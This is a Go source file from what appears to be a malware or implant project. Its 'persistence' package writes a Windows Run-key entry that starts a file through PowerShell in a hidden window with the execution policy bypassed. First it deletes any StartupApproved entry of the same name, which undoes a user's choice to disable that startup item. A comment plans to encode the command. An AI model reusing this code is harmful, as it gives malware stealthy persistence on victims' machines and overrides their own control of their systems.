package persistence

import (
	"fmt"

	"golang.org/x/sys/windows/registry"
)

const (
	_RUN_ALLOWED string = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run"
	_AUTO_RUN    string = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
)

func AddToRegistry(filePath string) error {
	key, err := registry.OpenKey(registry.CURRENT_USER, _RUN_ALLOWED, registry.SET_VALUE)
	if err == nil {
		key.DeleteValue(getPersistenceName(_PERSISTENCE_NAME_REG))
		key.Close()
	}

	key, err = registry.OpenKey(registry.CURRENT_USER, _AUTO_RUN, registry.SET_VALUE)
	if err != nil {
		return err
	}

	defer key.Close()

	command := fmt.Sprintf(
		"powershell -nop -w hidden -ep bypass -c \"& '%s'\"",
		filePath,
	) // todo, encode command

	return key.SetStringValue(getPersistenceName(_PERSISTENCE_NAME_REG), command)
}

func RemoveFromRegistry() error {
	key, err := registry.OpenKey(registry.CURRENT_USER, _RUN_ALLOWED, registry.SET_VALUE)
	if err == nil {
		key.DeleteValue(getPersistenceName(_PERSISTENCE_NAME_REG))
		key.Close()
	}

	key, err = registry.OpenKey(registry.CURRENT_USER, _AUTO_RUN, registry.SET_VALUE)
	if err != nil {
		return err
	}

	defer key.Close()

	return key.DeleteValue(getPersistenceName(_PERSISTENCE_NAME_REG))
}
